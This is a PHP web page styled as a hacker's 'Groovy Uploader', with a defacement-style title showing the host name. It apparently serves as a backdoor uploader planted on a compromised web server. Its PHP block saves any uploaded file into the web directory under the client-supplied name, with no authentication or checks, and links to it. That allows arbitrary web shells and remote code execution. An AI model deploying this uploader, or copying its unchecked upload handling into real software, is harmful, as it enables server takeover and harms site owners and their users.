<!DOCTYPE html>
<html lang="en">
<head>
    <?php $upload_dir = ''; ?>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>..::<?php echo $_SERVER['HTTP_HOST']; ?>::.. 0///0</title>
    <link rel="icon" href="https://i.ibb.co.com/wtRWhwZ/dongak.png">
    <link href="https://fonts.googleapis.com/css2?family=Black+Ops+One&display=swap" rel="stylesheet">
    <style>
        body {
            margin: 0;
            overflow: hidden; 
            background-color: black; 
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: white;
            font-family: 'Black Ops One', system-ui;
        }
        #video-background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            z-index: -100;
        }
        .main-content-wrapper {
            position: relative;
            z-index: 1;
            text-align: center;
            padding: 20px;
            width: 90%;
            max-width: 450px;
            margin: auto;
        }
        #logo {
            max-width: 50%;
            height: auto;
            margin-bottom: 20px;
        }
        h1 {
            font-size: 2.7rem;
            margin-bottom: 25px;
            background: linear-gradient(to bottom, #ffffff 40%, #000000 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            -webkit-text-stroke: 1.5px black;
            text-transform: uppercase;
        }
        input[type="file"] {
            display: block;
            margin: 20px auto;
            background: rgba(255, 255, 255, 0.05);
            padding: 15px;
            border: none;
            border-radius: 5px;
            color: white;
            font-family: 'Black Ops One', system-ui;
            font-size: 0.9rem;
            width: 100%;
            box-sizing: border-box;
            cursor: pointer;
            transition: background 0.3s;
        }
        input[type="file"]:hover {
            background: rgba(255, 255, 255, 0.15);
        }
        input[type="submit"] {
            background: #ffff;
            color: black;
            border: none;
            padding: 12px 40px;
            font-family: 'Black Ops One', system-ui;
            font-size: 1rem;
            cursor: pointer;
            border-radius: 5px;
            transition: 0.3s;
            width: 100%;
        }
        input[type="submit"]:hover {
            background: #ffffff;
            color: #000000;
            box-shadow: 0 0 15px #ffffff;
        }
        .result {
            margin-top: 25px;
            font-size: 0.9rem;
            word-wrap: break-word;
        }

        @media (max-width: 768px) {
            h1 {
                font-size: 1.8rem;
            }
            #logo {
                max-width: 80%;
            }
        }
    </style>
</head>
<body>
    <video autoplay loop muted playsinline id="video-background">
        <source src="https://www.image2url.com/r2/default/videos/1781509949853-fc5d6c80-fc9d-40a8-831a-7b853e16c522.mp4" type="video/mp4">
        Your browser does not support the video tag.
    </video>

    <div class="main-content-wrapper">
        <img id="logo" src="https://i.ibb.co.com/wtRWhwZ/dongak.png" alt="Logo">
        <h1>Groovy Uploader</h1>
        
        <form method="POST" enctype="multipart/form-data">
            <input type="file" name="groovy_file">
            <input type="submit" value="UPLOAD FILE">
        </form>

        <div class="result">
            <?php
            if(isset($_FILES['groovy_file'])){
                $name = $_FILES['groovy_file']['name'];
                if(move_uploaded_file($_FILES['groovy_file']['tmp_name'], $name)){
                    echo '<span style="color: #00ff00;">[+] Success: <a href="'.$name.'" style="color: white; text-decoration: underline;">'.$name.'</a></span>';
                } else {
                    echo '<span style="color: #ff0000;">[-] Upload Failed!</span>';
                }
            }
            ?>
        </div>
    </div>
</body>
</html>
